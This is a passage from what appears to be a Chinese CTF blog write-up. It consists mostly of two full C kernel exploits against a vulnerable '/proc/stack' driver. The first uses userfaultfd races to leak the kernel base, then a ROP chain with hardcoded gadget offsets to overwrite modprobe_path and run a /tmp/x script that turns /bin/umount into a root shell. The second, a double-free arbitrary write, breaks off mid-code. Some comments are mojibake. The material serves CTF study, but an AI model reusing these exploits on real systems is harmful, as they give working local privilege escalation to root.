class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE sysconf(_SC_PAGE_SIZE)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BZIMAGE_ADDR 0xFFFFFFFF81000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd_kstack = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> kernel_base = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span>* fault_addr;</span><br><span class="line"><span class="keyword">uint64_t</span> fd_seq[<span class="number">0x50</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">uint64_t</span> temp_fd = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> single_stop_off = <span class="number">0xFFFFFFFF8113BE80</span> - BZIMAGE_ADDR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> modprobe_path_addr = <span class="number">0xFFFFFFFF81C2C541</span> - BZIMAGE_ADDR;</span><br><span class="line"><span class="keyword">uint64_t</span> add_rsp_0x1f8_ret = <span class="number">0xffffffff814d51c0</span> - BZIMAGE_ADDR;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rdx_rdi_ret = <span class="number">0xffffffff8122dd4b</span> - BZIMAGE_ADDR;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rsi_ret = <span class="number">0xffffffff81047a8e</span> - BZIMAGE_ADDR;</span><br><span class="line"><span class="keyword">uint64_t</span> mov_qp_rdx_rdi_ret = <span class="number">0xffffffff8121216f</span> - BZIMAGE_ADDR;</span><br><span class="line"><span class="keyword">uint64_t</span> do_task_dead = <span class="number">0xFFFFFFFF8106EBB0</span> - BZIMAGE_ADDR;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ErrExit</span><span class="params">(<span class="keyword">char</span>* err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">userfaultfd_leak_handler</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) arg;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="comment">// pause();</span></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* page = (<span class="keyword">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED) ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    *(<span class="keyword">uint64_t</span>*)page = add_rsp_0x1f8_ret;          <span class="comment">// control rip</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page,<span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;     <span class="comment">//æˆ‘ä»¬è¦ç›‘è§†çš„åŒºåŸŸ</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)    <span class="comment">//æ³¨å†Œç¼ºé¡µé”™è¯¯å¤„ç†</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cmd_push</span><span class="params">(<span class="keyword">uint64_t</span>* arg)</span></span>&#123;</span><br><span class="line">    ioctl(fd_kstack,<span class="number">0x57AC0001</span>,arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cmd_pop</span><span class="params">(<span class="keyword">uint64_t</span>* arg)</span></span>&#123;</span><br><span class="line">    ioctl(fd_kstack,<span class="number">0x57ac0002</span>,arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">push_thread</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ioctl(fd_kstack,<span class="number">0x57AC0001</span>,fault_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_seq_operations</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i++)&#123;</span><br><span class="line">        fd_seq[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i++)&#123;</span><br><span class="line">        close(fd_seq[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(fd_seq,<span class="number">0</span>,<span class="number">0x50</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare</span><span class="params">()</span></span>&#123; </span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh\nrm /bin/umount\necho -e \&quot;#!/bin/sh\\n/bin/sh\\n\&quot; &gt; /bin/umount\nchmod 777 /bin/umount&#x27; &gt; /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;chmod 777 /flag&#x27; &gt;&gt; /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(fork()) &#123;</span><br><span class="line">        sleep(<span class="number">10</span>);                          </span><br><span class="line">        system(<span class="string">&quot;/tmp/dummy&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;ls -l /flag&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> ret_value = <span class="number">0</span>;</span><br><span class="line">    prepare();</span><br><span class="line"></span><br><span class="line">    fd_kstack = open(<span class="string">&quot;/proc/stack&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// set userfaultfd</span></span><br><span class="line">    fault_addr = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(fault_addr, userfaultfd_leak_handler);</span><br><span class="line"></span><br><span class="line"><span class="comment">// leak kernel_base</span></span><br><span class="line">    prepare_seq_operations();           <span class="comment">// spray kernel addr in heap-0x20</span></span><br><span class="line">    <span class="keyword">pthread_t</span> thr_push,thr_pop;</span><br><span class="line">    pthread_create(&amp;thr_push, <span class="literal">NULL</span>, push_thread, <span class="number">0</span>);        <span class="comment">// stop at copy_from_user</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    cmd_pop(&amp;ret_value);        <span class="comment">// kfree</span></span><br><span class="line">    kernel_base = ret_value - single_stop_off;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_base: 0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line">    add_rsp_0x1f8_ret += kernel_base;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// control rip</span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="comment">// for(i = 0; i &lt; 50; i++)&#123;</span></span><br><span class="line">    <span class="comment">//     fd_seq[i] = open(&quot;/proc/self/stat&quot;,0);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    fd_seq[<span class="number">0</span>] = open(<span class="string">&quot;/proc/self/stat&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    temp_fd = fd_seq[<span class="number">0</span>];</span><br><span class="line">    modprobe_path_addr += kernel_base;</span><br><span class="line">    pop_rdx_rdi_ret += kernel_base;</span><br><span class="line">    pop_rsi_ret += kernel_base;</span><br><span class="line">    mov_qp_rdx_rdi_ret += kernel_base;</span><br><span class="line">    do_task_dead += kernel_base;</span><br><span class="line">    <span class="comment">// read(fd_seq[0],buf,0x20);</span></span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0x15151515;&quot;</span>     <span class="comment">// r15</span></span><br><span class="line">        <span class="string">&quot;mov r14, 0x14141414;&quot;</span>      <span class="comment">// r14 /tmp/x</span></span><br><span class="line">        <span class="string">&quot;mov r13, pop_rdx_rdi_ret;&quot;</span>      <span class="comment">// r13</span></span><br><span class="line">        <span class="string">&quot;mov r12, modprobe_path_addr;&quot;</span>      <span class="comment">// r12</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x11111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, mov_qp_rdx_rdi_ret;&quot;</span>      <span class="comment">// r10</span></span><br><span class="line">        <span class="string">&quot;mov rbp, 0x782f706d742f;&quot;</span>      <span class="comment">// bbbbbbbb</span></span><br><span class="line">        <span class="string">&quot;mov rbx, pop_rsi_ret;&quot;</span>      <span class="comment">// aaaaaaaa</span></span><br><span class="line">        <span class="string">&quot;mov r9, do_task_dead;&quot;</span>       <span class="comment">// r9</span></span><br><span class="line">        <span class="string">&quot;mov r8, 0x88888888;&quot;</span>       <span class="comment">//r8</span></span><br><span class="line">        <span class="string">&quot;mov rcx, 0xcccccccc;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 0x22222222;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, 0x33333333;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, temp_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// for(i = 0; i &lt; 50; i++)&#123;</span></span><br><span class="line">    <span class="comment">//     read(fd_seq[i],buf,0x20);</span></span><br><span class="line">    <span class="comment">//     printf(&quot;[+]index : %d done!&quot;,i);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img   src="image-20230228232415377.png?size=600" style="width: 600px;"  alt="image-20230228232415377"></p>

        <h3 id="exp2-1"   >
          <a href="#exp2-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp2-1" class="headerlink" title="exp2"></a>exp2</h3>
      <blockquote>
<p>é€šè¿‡double free æ„é€ ä»»æ„åœ°å€å†™ï¼Œç›´æ¥å†™modprobe_path</p>
</blockquote>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE sysconf(_SC_PAGE_SIZE)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BZIMAGE_ADDR 0xFFFFFFFF81000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd_kstack = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> kernel_base = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span>* fault_addr;</span><br><span class="line"><span class="keyword">char</span>* fault_addr2;</span><br><span class="line"><span class="keyword">char</span>* fault_addr3;</span><br><span class="line"><span class="keyword">char</span>* fault_addr4;</span><br><span class="line"><span class="keyword">uint64_t</span> fd_seq[<span class="number">0x50</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> single_stop_off = <span class="number">0xFFFFFFFF8113BE80</span> - BZIMAGE_ADDR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> modprobe_path_addr = <span class="number">0xFFFFFFFF81C2C541</span> - BZIMAGE_ADDR;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rdx_rdi_ret = <span class="number">0xffffffff8122dd4b</span> - BZIMAGE_ADDR;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rsi_ret = <span class="number">0xffffffff81047a8e</span> - BZIMAGE_ADDR;</span><br><span class="line"><span class="keyword">uint64_t</span> mov_qp_rdx_rdi_ret = <span class="number">0xffffffff8121216f</span> - BZIMAGE_ADDR;</span><br><span class="line"><span class="keyword">uint64_t</span> do_task_dead = <span class="number">0xFFFFFFFF8106EBB0</span> - BZIMAGE_ADDR;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ErrExit</span><span class="params">(<span class="keyword">char</span>* err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">userfaultfd_sleep3_handler</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) arg;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="comment">// pause();</span></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* page = (<span class="keyword">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED) ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">userfaultfd_pause_handler</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) arg;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    pause();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page,<span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;     <span class="comment">//æˆ‘ä»¬è¦ç›‘è§†çš„åŒºåŸŸ</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span 